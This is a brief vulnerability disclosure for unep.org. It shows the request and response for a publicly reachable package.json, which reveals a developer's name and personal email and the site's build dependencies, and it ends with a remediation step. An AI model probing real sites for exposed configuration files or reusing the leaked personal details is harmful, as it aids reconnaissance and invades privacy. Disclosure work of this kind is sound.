# Misconfiguration vulnerability on unep.org
* `Exploit Author:` **Nguyen Phu Hung (d4rkp0w4r)**
* Parameter & Payload
```c
https://www.unep.org/package.json
```
* Request
```python=
GET /package.json HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Host: www.unep.org
Connection: Keep-alive

```
* Response 
```python=
HTTP/1.1 200 OK
Date: Fri, 22 Jul 2022 18:32:20 GMT
Content-Type: application/json
Connection: keep-alive
last-modified: Wed, 20 Jul 2022 15:48:57 GMT
etag: W/"62d823e9-33a"
x-owner: dcpi
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 72ee4226789d4947-SIN
Original-Content-Encoding: br
Content-Length: 826

{
  "name": "unep",
  "version": "1.0.0",
  "description": "Dev package for UNEP using gulp",
  "main": "gulpfile.js",
  "scripts": {
    "test": "watch"
  },
  "keywords": [
    "unep"
  ],
  "author": "Gregory W Mwaura (gwanjama@gmail.com)",
  "license": "ISC",
  "devDependencies": {
    "autoprefixer": "^9.6.1",
    "cssnano": "^4.1.10",
    "gulp": "^4.0.2",
    "gulp-changed": "^4.0.0",
    "gulp-concat": "^2.6.1",
    "gulp-if": "^2.0.2",
    "gulp-imagemin": "^6.0.0",
    "gulp-livereload": "^4.0.1",
    "gulp-plumber": "^1.2.1",
    "gulp-postcss": "^8.0.0",
    "gulp-sass": "^4.0.2",
    "gulp-sourcemaps": "^2.6.5",
    "gulp-uglifyjs": "^0.6.2",
    "imagemin-pngquant": "^8.0.0"
  },
  "browserslist": [
    "last 2 versions",
    "ie >= 9",
    "android >= 4.4",
    "ios >= 7"
  ],
  "dependencies": {}
}

```
* How to fix this vulnerability.
* Remove or restrict access to all configuration files acessible from internet.
